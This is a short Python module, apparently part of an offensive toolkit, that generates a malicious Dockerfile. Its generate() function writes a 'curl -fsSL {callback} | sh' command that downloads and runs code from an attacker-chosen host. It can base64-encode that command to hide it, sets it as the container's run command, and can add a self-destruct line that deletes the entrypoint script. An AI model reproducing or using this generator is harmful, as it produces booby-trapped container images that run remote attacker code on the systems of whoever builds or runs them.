"""Docker payload generator."""
from __future__ import annotations

import base64
from textwrap import dedent
from typing import Optional

from ...payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def generate(repo: str, callback: str, encode: Optional[str] = None, self_destruct: bool = True) -> str:
    """Return a Dockerfile payload executing ``callback`` at runtime."""

    cmd = f"/bin/sh -c 'curl -fsSL {callback} | sh'"
    if encode == "b64":
        b = base64.b64encode(cmd.encode()).decode()
        run = f"/bin/sh -c `echo {b} | base64 -d`"
    else:
        run = cmd
    dockerfile = builder.render(
        "dockerfile.j2",
        base_image="alpine:latest",
        cmd=run,
        payload_code=run,
    )
    if self_destruct:
        dockerfile += "\nRUN rm -f /entrypoint.sh"
    return dockerfile
